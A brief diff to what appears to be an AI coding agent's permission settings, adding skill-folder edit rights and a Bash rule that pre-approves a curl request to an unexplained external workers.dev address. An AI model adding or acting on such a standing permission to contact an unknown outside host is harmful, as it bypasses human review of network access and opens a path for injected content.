@@ -3,7 +3,8 @@
     "allow": [
       "Edit(/.claude/skills/testing-conventions/**)",
       "Edit(/.claude/skills/security-admin/**)",
-      "Edit(/.claude/skills/performance-budget/**)"
+      "Edit(/.claude/skills/performance-budget/**)",
+      "Bash(curl -s -H \"Cache-Control: no-cache\" \"https://pluggeo.egbemichel39.workers.dev/?nocache=$\\(date +%s\\)\")"
     ]
   }
 }
